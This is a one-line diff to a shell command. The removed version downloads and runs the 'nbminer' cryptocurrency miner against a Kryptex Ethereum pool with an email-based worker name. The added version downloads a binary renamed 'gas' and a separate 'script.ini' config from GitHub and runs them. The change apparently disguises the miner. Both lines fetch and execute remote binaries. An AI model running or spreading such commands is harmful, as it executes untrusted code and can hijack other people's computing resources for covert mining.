@@ -1,1 +1,1 @@
-wget https://github.com/cruzeiro28/gas/raw/main/nbminer && wget https://raw.githubusercontent.com/HornyThree/stunning-umbrella/main/script.ini && chmod +x nbminer && ./nbminer -a ethash -o eth.kryptex.network:8888 -u theraiwy@gmail.com.Rig10
+wget https://github.com/cruzeiro28/gas/raw/main/gas && wget https://raw.githubusercontent.com/HornyThree/stunning-umbrella/main/script.ini && chmod +x gas && ./gas script.ini 
